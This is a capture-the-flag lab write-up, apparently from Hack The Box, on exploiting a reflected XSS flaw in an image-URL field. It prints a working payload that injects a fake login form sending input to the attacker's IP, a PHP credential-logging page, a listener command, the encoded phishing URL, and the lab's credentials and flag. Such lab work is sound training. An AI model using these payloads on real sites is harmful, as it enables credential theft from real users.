
### Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

Navigated to http://10.129.234.166/phishing/ and was presented with a Image URL input box

![[Pasted image 20260722191818.png]]

Inspecting the HTML page shows the input box sends URLs to index.php

![[Pasted image 20260722191929.png]]

Submitting "test" as the URL results in a broken image. 
![[Pasted image 20260722192110.png]]

After some manual testing, simply putting a ' as a value for the url parameter proves the reflected XSS. I used xsstrike to generate a payload:

```go
python3 xsstrike.py -u "http://10.129.234.166/phishing/index.php?url="
```

![[Pasted image 20260722193329.png]]

![[Pasted image 20260722193553.png]]

Crafting XSS payload:
```go
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Submitting the payload to the URL parameter:
![[Pasted image 20260722195224.png]]

Now I need to ensure I remove the element with ID of `urlform`, place the JS code inside <script></script> tags and comment out all left ofter elements
```go
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.16.3><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

The payload works!
![[Pasted image 20260722201337.png]]

index.php page to log victims credentials from HTTP request. I stored this in /tmp/tmpserver
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.234.166/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Start a PHP listener:
```go
sudo php -S 0.0.0.0:80
```

I need to URL encode the payload portion and reattach to the URL. Did so with cyberchef:
```go
http://10.129.234.166/phishing/index.php?url='><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.16.3><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

```go
http://10.129.234.166/phishing/index.php?url=%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

![[Pasted image 20260722205348.png]]

Credentials:
```go
admin
```

```go
p1zd0nt57341myp455
```

Head to the login.php and submit to get the flag
```go
HTB{r3f13c73d_cr3d5_84ck_2_m3}
```